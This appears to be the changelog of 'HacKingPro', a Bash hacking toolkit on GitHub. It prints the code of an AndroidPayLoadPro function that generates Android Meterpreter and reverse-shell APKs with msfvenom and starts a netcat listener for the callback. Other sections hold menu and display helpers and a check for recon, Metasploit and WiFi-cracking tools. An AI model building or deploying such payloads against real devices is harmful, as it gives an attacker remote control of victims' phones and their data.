> בס״ד

<h2 align="center">

 ⫷[D̷̨̥̥̥͖̞͐ͮ̄A̳̳̹̟̋ͣ͌ͅT̼̼̖̾͟͞Ơ̷̴̪̪̝͈̥͈̆̀̚S̢̼̼͖̺͖ͪ](https://github.com/AnLoMinus/AnLoMinus/blob/main/DATOS.md)⫸ <br> <br>

 🌑🌒🌓🌔🌕🌖🌗🌘🌑

<p align="center">🔱 We believe in God, everyone else is suspicious 🔱</p>

</h2>

<div align="center">

<a href="https://github.com/AnLoMinus">⚜️ A̍ͭͩnLͭ̇̎̏̒oͩM̳͇i͎̞̝̪n̹̘̓ͣ̓͊̓ů͕̈s̙͉͎̫̈̌̇̐̂ ⚜️</a>

⫷ [`HacKingPro`](https://github.com/AnLoMinus/HacKingPro) ⫸

</div>

---

### 🎯 **ToDO**
* [ ] [f8x](https://github.com/ffffffff0x/f8x) | Red/Blue team environment automation deployment tool
* [ ]

---

# 🔮 Changelog 🔮


> 🔮 | Released | HacKingPro | v0.0.0.27 | 09:40 | 10/08/2022 | 🔮
### ➕ BugFix 🔮
- [x] Every Enter hit Getting refreshing Netwrok Status   

### ➕ New Functions 🔮
- [x] #### `CreateAndroidShell`  
- [x] #### `AndroidPayLoadPro` | # Creating Android  PayLoad with `msfvenom`
```sh
AndroidPayLoadPro(){
  CreateAndroidShell(){
    msfvenom -p $apv LHOST=${LocalHostIP} LPORT=$lport R > ${MainDirectoriyCaseName}/$payload.apk
  }
  clear
  while true; do
    #statements
    cd "${MainDirectoriyCaseName}"
    clear
    TargetStatusRun
    AndroidPayLoadProMenu=$(echo "
    ${LGreen}╔═╗╔╗╔╔╦╗╦═╗╔═╗╦╔╦╗     ${LRed}╔═╗╔═╗╦ ╦╦  ╔═╗╔╦╗
    ${LGreen}╠═╣║║║ ║║╠╦╝║ ║║ ║║     ${LRed}╠═╝╠═╣╚╦╝║  ║ ║ ║║
    ${LGreen}╩ ╩╝╚╝═╩╝╩╚═╚═╝╩═╩╝     ${LRed}╩  ╩ ╩ ╩ ╩═╝╚═╝═╩╝${DGrey}
    :::::::::::::::: [ TYPE ] ::::::::::::::::::

    ${DGrey}┏➡${BYellow}╼▰ ${BRed}[${ORANGE} ${slowBlink}P${resetT} ${BRed}]${BYellow}╼▰ ${BRed}[${ORANGE} Planning PayLoad ${BRed}]
    ${DGrey}┗┲──⇢${BYellow}╼▰ ${BRed}[${ORANGE} Export Name ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} ${payload} ${BRed}]${BYellow}╼▰
    ${DGrey} ┣──⇢${BYellow}╼▰ ${BRed}[${ORANGE} Listening IP ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} ${LocalHostIP} ${BRed}]${BYellow}╼▰
    ${DGrey} ┣──⇢${BYellow}╼▰ ${BRed}[${ORANGE} Listening Port ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} ${lport} ${BRed}]${BYellow}╼▰
    ${DGrey} ┗──⇢${BYellow}╼▰ ${BRed}[${ORANGE} Payload Location ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} ${apv} ${BRed}]${BYellow}╼▰

    ${DGrey}┏⇢${BYellow}╼▰ ${BRed}[${ORANGE} ${slowBlink}CP${resetT} ${BRed}]${BYellow}╼▰ ${BRed}[${ORANGE} Choose PayLoad ${BRed}]
    ${DGrey}┗┲──⇢${BYellow}╼▰ ${BRed}[${ORANGE} 1 ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} android/meterpreter/reverse_http ${BRed}]${BYellow}╼▰
    ${DGrey} ┣──⇢${BYellow}╼▰ ${BRed}[${ORANGE} 2 ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} android/meterpreter/reverse_https ${BRed}]${BYellow}╼▰
    ${DGrey} ┣──⇢${BYellow}╼▰ ${BRed}[${ORANGE} 3 ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} android/meterpreter/reverse_tcp ${BRed}]${BYellow}╼▰
    ${DGrey} ┣──⇢${BYellow}╼▰ ${BRed}[${ORANGE} 4 ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} android/meterpreter_reverse_http ${BRed}]${BYellow}╼▰
    ${DGrey} ┣──⇢${BYellow}╼▰ ${BRed}[${ORANGE} 5 ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} android/meterpreter_reverse_https ${BRed}]${BYellow}╼▰
    ${DGrey} ┣──⇢${BYellow}╼▰ ${BRed}[${ORANGE} 6 ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} android/meterpreter_reverse_tcp ${BRed}]${BYellow}╼▰
    ${DGrey} ┣──⇢${BYellow}╼▰ ${BRed}[${ORANGE} 7 ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} android/shell/reverse_http ${BRed}]${BYellow}╼▰
    ${DGrey} ┣──⇢${BYellow}╼▰ ${BRed}[${ORANGE} 8 ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} android/shell/reverse_https ${BRed}]${BYellow}╼▰
    ${DGrey} ┗──⇢${BYellow}╼▰ ${BRed}[${ORANGE} 9 ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} android/shell/reverse_tcp ${BRed}]${BYellow}╼▰

    ${DGrey}┏➡${BYellow}╼▰ ${BRed}[${LCyan} ${slowBlink}EP${resetT} ${BRed}]${BYellow}╼▰ ${BRed}[${LCyan} Export PayLoad ${BRed}]
    ${DGrey}┗┲──⇢${BYellow}╼▰ ${BRed}[${BCyan} Export Location ${BRed}]${BYellow}╼▰ ${BRed}[${BCyan} ${MainDirectoriyCaseName}/$paylod.apk  ${BRed}]${BYellow}╼▰
    ${DGrey} ┗──⇢${BYellow}╼▰ ${BRed}[${BGreen} Command Executed ${BRed}]${BYellow}╼▰ ${BRed}[${BGreen} msfvenom -p $apv LHOST=${LocalHostIP} LPORT=$lport R > ${MainDirectoriyCaseName}/$payload.apk ${BRed}]${BYellow}╼▰

    ${DGrey}┏➡${BYellow}╼▰ ${BRed}[${LGreen} ${slowBlink}SL${resetT} ${BRed}]${BYellow}╼▰ ${BRed}[${LGreen} Start Listener ${BRed}]
    ${DGrey}┗──⇢${BYellow}╼▰ ${BRed}[${BGreen} Command Executed ${BRed}]${BYellow}╼▰ ${BRed}[${BGreen} nc -l ${lport} ${BRed}]${BYellow}╼▰

    ${BGreen}┏──${BRed}[${DGrey} ~$(pwd) ${BRed}]
    ${BGreen}|
    ${BGreen}┗──${BRed}[${BYellow} $Anlominus ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} Exploitation ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} Android PayLoad ${BRed}]${BYellow}╼▰  ${BGreen}  ")
    read -p "${AndroidPayLoadProMenu}" cmd
    case "$cmd" in
      p|P)
      SettingPayload(){
        echo " "
        echo "    ${DGrey}┏➡ ${BRed}[${ORANGE} Setting PayLoad ${BRed}]${BYellow}╼▰  "

        abc1="$(echo "    ${DGrey}┗┲──⇢ ${BRed}[${ORANGE} Enter File Name ${BRed}]${BYellow}╼▰  ")"
        if [ -z ${payload} ]; then
          #statements
          payload="AnLoMinus"
        else
          read -p "${abc1}" payload
        fi

        if [ -z "${LocalHostIP}" ]; then
          #statements
          abc2="$(echo "    ${DGrey} ┣──⇢ ${BRed}[${ORANGE} Enter Listening IP ${LocalHostIP} ${BRed}]${BYellow}╼▰  ")"
          read -p "${abc2}" LocalHostIP
        fi
        if [ -z "${LocalHostIP}" ]; then
        LocalHostIP="127.0.0.1"
      fi

        abc3="$(echo "    ${DGrey} ┗──⇢ ${BRed}[${ORANGE} Enter Listening Port ${BRed}]${BYellow}╼▰  ")"
        if [ -z ${lport} ]; then
          #statements
          lport="4444"
        else
          read -p "${abc3}" lport
        fi
      }
      SettingPayload

      ;;
      ep|EP)
      CreateAndroidShell
      read -p "${Press_ENTER}"
      ;;
      sl|SL)
      nc -l ${lport}
      # nc -l ${lport} | nc ${UserName} ${TargetPort}
      read -p "${Press_ENTER}"
      ;;
      1)
      clear
      apv='android/meterpreter/reverse_http'
      ;;
      2)
      clear
      apv='android/meterpreter/reverse_https'
      ;;
      3)
      clear
      apv='android/meterpreter/reverse_tcp'
      ;;
      4)
      clear
      apv='android/meterpreter_reverse_http'
      ;;
      5)
      clear
      apv='android/meterpreter_reverse_https'
      ;;
      6)
      clear
      apv='android/meterpreter_reverse_tcp'
      ;;
      7)
      clear
      apv='android/shell/reverse_http'
      ;;
      8)
      clear
      apv='android/shell/reverse_https'
      ;;
      9)
      clear
      apv='android/shell/reverse_tcp'
      ;;
      ls )
      lahs
      ;;
      x|X|exit|quit|Exit )
      clear
      cd ${MainDirectoriy}
      HacKingPro=$(echo "${BRed}Hac${BYellow}King${BBlue}Pro")
      echo "\n\t\t ${BRed}[🙏🏼${BRed}] ${BWhite}Exit ${HacKingPro} ${BRed}[🙏🏼${BRed}]\n\t\t ${BGreen}"
      break
      ;;
      * )
      echo "$InvalidOption"
      ;;
    esac
  done

}
```


- [x] #### 🤩 `AwesomeAsking` 🤩
> ### Asking for Running Fuctions Builtin and Commands
#### ✅ `Function for Asking To Run Functions or Commands`

```sh
####################
#| ✅ | AwesomeAsking
######################

AwesomeAsking(){
  while  true; do
    #statements
    AwesomeAskingEcho="$(echo "
    ${ORANGE}┌╼▰ ${LGreen}[${LYellow} $1 ${LGreen}]
    ${ORANGE}┖─╼▰ ${LGreen}[ ${LGrey}y/Y ${LGreen}]${ORANGE}──${LGreen}[ ${LGrey}n/N ${LGreen}] ${ORANGE}──────╼▰  ${LGrey}")"
    read -p "${AwesomeAskingEcho}"  AwesomeAskingCmd
    case $AwesomeAskingCmd in
      y|Y|yes|YES)
      (echo "$1")
      ;;
      n|N|no|NO)
      break
      ;;
      * )
      break
      ;;
    esac
  done
}

AwesomeAsking CheckRequiredPro "Want Checking Requirements?"
```
---

# 🔮 Changelog 🔮
🔮 HacKingPro | v0.0.0.26 | Released | 10/08/2022 | 09:40 🔮

### 🤩 New Functions 🔮
```
####################
| ✅ | AwesomePrint
| ✅ | AwesomeLine
| ✅ | MiniHeaderSta
| ✅ | MiniHeaderEnd
| ✅ | CheckThatPro
| ✅ | CheckRequiredPro
| ✅ | Input_Local_Interface
| ✅ | Info_LocalNet
####################
```
## [0.0.0.26] ⌛️ 10-08-2022

## ➕ `Functions Print Awesome` ✅
- [x] `AwesomePrint`
```sh
AwesomePrint(){
  echo "\n"
  echo "    ${ORANGE}${faintT}┌╼  $dcdv "
  sleep 0.1
  echo "    ${ORANGE}${faintT}|─╼  $dcdv "
  sleep 0.1
  echo "    ${resetT}${ORANGE}|──╼ $5 "
  sleep 0.1
  echo "    ${ORANGE}${faintT}|─╼  $dcdv "
  sleep 0.1
  echo "    ${ORANGE}${faintT}└╼  $dcdv "
  echo "\n${resetT}"
}
```
- [x] `AwesomeLine`
```sh
AwesomeLine(){
	local WhatHeader="$@"
  echo "\n"
  echo "${BBlue}🔮-=x=-=x=-=x=-=x=-=x=-=x=-=${LYellow}[ ${slowBlink}${WhatHeader}${resetT} ${LYellow}]${BBlue}=-=x=-=x=-=x=-=x=-=x=-=x=-=x=-=x=-🔮"
  echo "\n${resetT}"
}
```
## ➕ `Functions to Check Required Programs` ✅
- [x] `MiniHeaderSta`
```sh
MiniHeaderSta(){
  echo "${BYellow}"
  figlet -f small $1
  echo " "
  echo "    ${LGreen}${faintT}┌───${ORANGE}╼${resetT}${LGreen}╼▰  ${resetT}${ORANGE}[ ${LYellow}$@${ORANGE} ] ${resetT}"
  echo "    ${LGreen}${faintT}|"
}
```
- [x] `MiniHeaderEnd`
```sh
MiniHeaderEnd(){
  echo "    ${LGreen}${faintT}|"
  echo "    ${LGreen}${faintT}└───${ORANGE}╼${resetT}${LGreen}╼▰  ${resetT}${ORANGE}[ ${LYellow}$@${ORANGE} ] ${resetT}"
  echo " "
}
```
- [x] `CheckThatPro`
```sh
CheckThatPro(){
  sleep 0.1
  if [ -z $1 ]; then
    echo "\n"
    echo "    ${LRed}|──╼${BRed}[${slowBlink} ❌ ${resetT}${BRed}]${LRed}──╼▰ ${BRed}[${LRed} Please Set Something To Find ${BRed}]"
    echo "\n"
  else
    which ${1} &> /dev/null
    if [ ${?} = 0 ]; then
      ToolPath=$(which ${1})
      echo "    ${BCyan}${faintT}|──╼${resetT}${BRed}[ ✅ ]${BCyan}${faintT}──╼${resetT}${LGreen}╼▰ ${LCyan}[ ${1} ]${BCyan}${faintT}──╼${resetT}${LGreen}╼▰ ${BRed}[${BCyan} ${ToolPath} ${BRed}]"
    else
      echo "    ${BCyan}${faintT}|──╼${resetT}${BRed}[ ${slowBlink}❌${resetT}${BRed} ]${BCyan}${faintT}──╼${resetT}${LRed}╼▰ ${BRed}[ ${1} ]${BCyan}${faintT}──╼${resetT}${LRed}╼▰ ${BRed}[ Sorry ${BRed}Not Found! ${BRed}]"
    fi
  fi
}
```
- [x] `CheckRequiredPro`
```sh
CheckRequiredPro(){
  AwesomeLine "🔶 Checking Required Programs 🔶"

  MiniHeaderSta "System Pack"
  CheckThatPro ps
  CheckThatPro sh
  CheckThatPro nc
  CheckThatPro su
  CheckThatPro top
  CheckThatPro git
  CheckThatPro zsh
  CheckThatPro apt
  CheckThatPro sudo
  CheckThatPro bash
  CheckThatPro less
  CheckThatPro last
  CheckThatPro host
  CheckThatPro ping
  CheckThatPro whoami
  CheckThatPro figlet
  CheckThatPro python
  CheckThatPro python2
  CheckThatPro python3
  CheckThatPro apktool
  CheckThatPro tcpdump
  CheckThatPro netstat
  CheckThatPro ifconfig
  CheckThatPro enum4linux 
  MiniHeaderEnd "System Pack"
  read -p "${Press_ENTER}"

  MiniHeaderSta "Reconnaissance & Information Gathering "
  CheckThatPro ip
  CheckThatPro who
  CheckThatPro dig
  CheckThatPro arp
  CheckThatPro curl
  CheckThatPro wget
  CheckThatPro nmap
  CheckThatPro dirb
  CheckThatPro amass
  CheckThatPro whois
  CheckThatPro nikto
  CheckThatPro tshark
  CheckThatPro kismet
  CheckThatPro dnsmap
  CheckThatPro dnswalk
  CheckThatPro dnsenum
  CheckThatPro gobuster
  CheckThatPro nslookup
  CheckThatPro dnsrecon
  CheckThatPro beef-xss
  CheckThatPro SubFinder
  CheckThatPro Sublist3r
  CheckThatPro smbclient
  CheckThatPro wireshark
  CheckThatPro traceroute
  CheckThatPro netdiscover
  MiniHeaderEnd "Reconnaissance & Information Gathering "
  read -p "${Press_ENTER}"

  MiniHeaderSta "Delivery "
  CheckThatPro ssh
  CheckThatPro ftp
  MiniHeaderEnd "Delivery "
  read -p "${Press_ENTER}"

  MiniHeaderSta "Exploitation "
  MiniHeaderSta "Metasploit Framework"
  CheckThatPro msfd
  CheckThatPro msfdb
  CheckThatPro msfrpc
  CheckThatPro msfvenom
  CheckThatPro msfconsole
  MiniHeaderEnd "Metasploit Framework"
  MiniHeaderEnd "Exploitation "
  read -p "${Press_ENTER}"

  MiniHeaderSta "WiFi HacKing"
  CheckThatPro wifite
  CheckThatPro airmon-ng
  CheckThatPro airbase-ng
  CheckThatPro aircrack-ng
  CheckThatPro airodump-ng
  CheckThatPro aireplay-ng
  CheckThatPro airdecap-ng
  CheckThatPro airdecloak-ng
  MiniHeaderEnd "WiFi HacKing"
  read -p "${Press_ENTER}"

  AwesomeLine "✅ Finish Checking Required Programs ✅"

  echo "\n"
}
```
- #  Main Menu
- ### `0` - Anonimity >
- #### `nt` - NetPro >
    - [x] `Input_Local_Interface`
    ```sh
    clear
    echo "\n"
    echo  "    [*] Finding your Network Interfaces... "$GREEN
    ifconfig -a
    echo "\n"
    echo  "    [*] Enter Your Interface : "${BBlue}
    read LocalHostNAME
    ```
    - [x] `Info_LocalNet`
    ```sh
    Input_Local_Interface
    LocalHostIP="$(ipconfig getifaddr ${LocalHostNAME} 2>/dev/null)"
    DefaultGatewayIP="$(arp -a 2>/dev/null | head -1 | awk -F"[)(]" '{print $2}')"
    DefaultGatewayNAME="$(arp -a 2>/dev/null | head -1 | awk -F"[)(]" '{print $1}')"
    ```

---

# | HacKingPro | v0.0.0.25 |
## | Released | 08/08/2022 | 03:50 |

#### [+] New
- [x] [+] Create Versions File
- [x] [+] MainMenu > [0] Anonimity > [nt] NetPro
- [x] [+] MainMenu > [4] Exploitation > [xp] XPloits

#### [*] BugFix
- [x] [*]  Many Bugs


---

# Examples
- [x] [?] Ask
- [x] [!] Info
- [x] [+] Adding
- [x] [-] Delete
- [x] [*] Fixing

---

## Developer [`AnLoMinus`](https://github.com/AnLoMinus")
